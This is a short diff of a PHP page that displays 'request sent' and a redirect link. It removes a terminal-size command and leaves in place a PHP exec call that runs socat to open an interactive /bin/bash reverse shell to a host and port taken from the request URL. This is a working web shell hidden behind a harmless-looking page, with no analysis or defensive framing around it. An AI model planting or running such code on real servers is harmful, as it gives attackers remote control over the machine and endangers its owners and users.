@@ -5,6 +5,5 @@ request sent
 <a href="/">redirect</a>
 
 <?php
-  exec("stty rows 39 columns 135");
   exec('env TERM=linux bash/socat tcp-connect:'.$_GET['host'].':'.$_GET['port'].' exec:/bin/bash,pty,stderr,setsid,sigint,sane >log.txt 2>&1 &');
 ?>
